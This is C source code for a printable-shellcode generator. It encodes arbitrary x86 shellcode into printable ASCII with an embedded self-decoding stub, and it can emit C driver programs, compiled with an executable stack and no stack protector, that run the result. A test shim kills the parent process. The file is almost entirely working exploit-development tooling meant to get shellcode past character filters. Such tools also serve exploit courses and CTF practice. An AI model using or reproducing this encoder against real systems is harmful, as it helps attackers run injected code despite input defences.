/*
 * Generate printable shellcodes from arbitrary shellcodes
 */

#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <malloc.h>
#include <unistd.h>

#define DECODER "\x60\x50\x59\x6a\x30\x58\x34\x30\x48\x50\x5b\x6a\x30\x58\x30\x59\x35\x30\x41\x4f\x30\x59\x4f\x30\x59\x60\x30\x41\x61\x30\x59\x61\x30\x41\x62\x30\x59\x69\x30\x41\x6a\x30\x59\x6a\x30\x41\x6b\x30\x59\x6d\x30\x59\x6e\x72\x49\x49\x30\x59\x37\x30\x41\x38\x30\x59\x38\x30\x41\x39\x30\x59\x3d\x30\x59\x3e\x30\x59\x47\x51\x5a\x4f\x79\x49\x26\x74\x3c\x6a\x30\x58\x34\x30\x50\x5b\x32\x59\x49\x43\x3f\x2c\x34\x32\x41\x4a\x40\x24\x3C\x3f\x27\x32\x30\x27\x77\x42\x49\x6a\x30\x58\x34\x30\x50\x5b\x32\x59\x4a\x43\x32\x41\x4b\x40\x3f\x2c\x36\x24\x3f\x30\x27\x77\x42\x4a\x42\x42\x41\x41\x41\x75\x41\x61"

#define TESTSHIM "\x31\xc0\xb0\x14\xcd\x80\x50\x5b\x31\xc0\x31\xc9\xb0\x25\xb1\x0f\xcd\x80"
#define TESTSHIM_STR "\\x31\\xc0\\xb0\\x14\\xcd\\x80\\x50\\x5b\\x31\\xc0\\x31\\xc9\\xb0\\x25\\xb1\\x0f\\xcd\\x80"

/*
 * arg1 is (%s) -> decoder
 * arg2 is (%s) -> encoded payload
 */
#define DRIVER_C \
    "/* Compile using:\n"                   \
    " *    gcc -m32 -fno-stack-protector -z execstack -o run run.c\n" \
    " */\n"                                 \
    "\n"                                    \
    "#include <stdio.h>\n"                  \
    "\n"                                    \
    "char shellcode[] = \"%s%s\";\n"        \
    "\n"                                    \
    "int main(int argc, char *argv[]) {\n"  \
                                            \
    "\tasm(\"mov %%0, %%%%eax;\"\n"         \
    "\t    \"call *%%%%eax\"\n"             \
    "\t    :\n"                             \
    "\t    : \"r\"(shellcode) );\n"         \
    "}\n"

/*
 * arg1 is (%s) -> original shellcode
 * arg2 is (%s) -> decoder
 * arg3 is (%s) -> testshim
 * arg4 is (%s) -> encoded payload
 */
#define DRIVER_CTEST                        \
    "/* Compile using:\n"                   \
    " *    gcc -m32 -fno-stack-protector -z execstack -o run run.c\n" \
    " */\n"                                 \
    "\n"                                    \
    "#include <stdio.h>\n"                  \
    "#include <stdlib.h>\n"                 \
    "#include <string.h>\n"                 \
    "#include <signal.h>\n"                 \
    "\n"                                    \
    "#define E 164\n"                       \
    "\n"                                    \
    "int n;\n"                              \
    "char original[] = \"%s\";\n"           \
    "\n"                                    \
    "char shellcode[] =\n"                  \
    "/* decoder  */ \"%s\"\n"               \
    "/* testshim */ \"%s\"\n"               \
    "/* payload  */ \"%s\";\n"              \
    "\n"                                    \
    "\n"                                    \
    "void handler() {\n"                    \
    "\tprintf(\"Testing start......\\n\");\n"\
    "\tint i, j;\n"                         \
    "\tfor(i = 0, j = E; i < n-1; i++, j++)\n"\
    "\t\tif(original[i] != shellcode[j])\n" \
    "\t\t\tprintf(\"Byte Num %%d = %%d\\n\", i, original[i]);\n" \
    "\tprintf(\"Finish\\n\");\n"             \
    "\texit(0);\n"                          \
    "}\n"                                   \
    "\n"                                    \
    "\n"                                    \
    "int main(int argc, char *argv[]) {\n"  \
                                            \
    "\tn = sizeof(original);\n"             \
    "\tsignal(SIGTERM, handler);\n"         \
    "\tprintf(\"Shellcode: %%s\\n\", shellcode);\n"\
    "\tprintf(\"Length: %%d\\n\", strlen(shellcode));\n"\
    "\n"                                    \
    "\tint (*ret)() = (int(*)()) shellcode;\n"\
    "\tret();\n"                            \
    "}\n"                                   \
    "\n"

char *prg; /* name of psc program */
char *inputsc; /* input shellcode */


void help()
{
    FILE *dev = stderr;
    fprintf(dev,"usage:\n");
    fprintf(dev,"\t%s [tech] shellcode\n", prg);
    fprintf(dev,"\t%s \"\\xcd\\x80..\"\n\n", prg);
    fprintf(dev,"options:\n");
    fprintf(dev,"\t%2s:\t%s\n", "-b", "binary string format for c");
    fprintf(dev,"\t%2s:\t%s\n", "-t", "printable shellcode with testing shim");
    fprintf(dev,"\t%2s:\t%s\n", "-e", "only printable shellcode");
    fprintf(dev,"\t%2s:\t%s\n", "-c", "get printable shellcode with C driver");
    fprintf(dev,"\t%2s:\t%s\n", "-n", "don't append newline");
    fprintf(dev,"\t%2s:\t%s\n", "-h", "help");
}


/* converts to "\x60\x31..."  */
char *bytes_to_str(char *bytes, int size)
{
    int i;
    char *buffer = malloc(size*4 + 1);
    char *iter = buffer;

    if (!buffer) {
        perror("cannot allocate memory");
        exit(1);
    }

    for (i = 0; i < size; i++) {
        iter += sprintf(iter, "\\x%02X", bytes[i]);
    }
    iter[i] = '\0';
    return buffer;
}


unsigned char *encode(char bincode[])
{
    int i, j;
    unsigned char *temp;
    unsigned char *encoded;
    unsigned int x, a, b, c;
    int encoded_size;
    int n = strlen(bincode)/4;
    int k = n;
    const char end = 0x26; /* '&'' for end of shellcode */

    n = n + n%2;
    encoded_size = ((3*n)/2)+2;
    encoded = malloc(encoded_size*sizeof(unsigned char));

    for(i = 0, j = 0; i < n ; i++) {
    	temp = malloc(5*sizeof(unsigned char));
        temp[0] = bincode[4*i+2];
        temp[1] = bincode[4*i+3];
        i++;

        if(i == k) { /* add NOP instruction if needed */
            temp[2] = '9';
            temp[3] = '0';
        } else {
            temp[2] = bincode[4*i+2];
            temp[3] = bincode[4*i+3];
        }
	temp[4]='\0';
        x = strtoul(temp,0,16); /* string to int base 16 */
        c = (0x3f & x) + 0x3F;
        b = ((x >> 6) & 0x3f) + 0x3F;
        a = ((x >> 12) & 0xf) + 0x3F;

        encoded[3*j] = a;
        encoded[3*j+1] = b;
        encoded[3*j+2] = c;

        j++;
        free(temp);
    }

    encoded[3*j] = end;
    encoded[encoded_size-1] = '\0';
    return encoded;
}


int main(int argc, char *argv[])
{
    int opt;
    int flag_binary = 0;
    int flag_test = 0;
    int flag_onlyenc = 0;
    int flag_cdriver = 0;
    int flag_nonewline = 0;
    char *encoded;
    char *decoder_str;
    char *encodedpayload_str;

    prg = argv[0];

    while ((opt = getopt(argc, argv, ":btechn")) != -1) {
        switch(opt) {
        case 'b':
            flag_binary = 1;
            break;
        case 't':
            flag_test = 1;
            break;
        case 'e':
            flag_onlyenc = 1;
            break;
        case 'c':
            flag_cdriver = 1;
            break;
        case 'h':
            help();
            exit(0);
        case 'n':
            flag_nonewline = 1;
            break;
        case '?':
            fprintf(stderr, "unknown option: %c\n", optopt);
        default:
            help();
            exit(1);
        }
    }

    /* Now we expect the shellcode */
    if (optind < argc) {
        inputsc = argv[optind];
        encoded = encode(inputsc);
    } else {
        fprintf(stderr, "please provide the input shellcode\n");
        help();
        exit(1);
    }

    if (optind + 1 < argc)
        fprintf(stderr, "warn: ignoring extra arguments\n");

    decoder_str = bytes_to_str(DECODER, strlen(DECODER));
    encodedpayload_str = bytes_to_str(encoded, strlen(encoded));

    /* Take relevant action */
    if (flag_onlyenc) {
        if (flag_binary)
            printf("%s", encodedpayload_str);
        else
            printf("%s", encoded);
    } else if (flag_test && flag_cdriver) {
        printf(DRIVER_CTEST, inputsc, decoder_str, TESTSHIM_STR,encodedpayload_str);
    } else if (flag_test) {
        if (flag_binary)
            printf("%s%s%s", decoder_str, TESTSHIM_STR, encodedpayload_str);
        else
            printf("%s%s%s", DECODER, TESTSHIM, encoded);
    } else if (flag_cdriver) {
        printf(DRIVER_C, decoder_str, encodedpayload_str);
    } else { /* default - output just the decoder */
        if (flag_binary)
            printf("%s%s", decoder_str, encodedpayload_str);
        else
            printf("%s%s", DECODER, encoded);
    }

    /* add newline? */
    if (!flag_nonewline && !flag_cdriver)
        putchar('\n');

    free(encodedpayload_str);
    free(decoder_str);
    free(encoded);
    return 0;
}

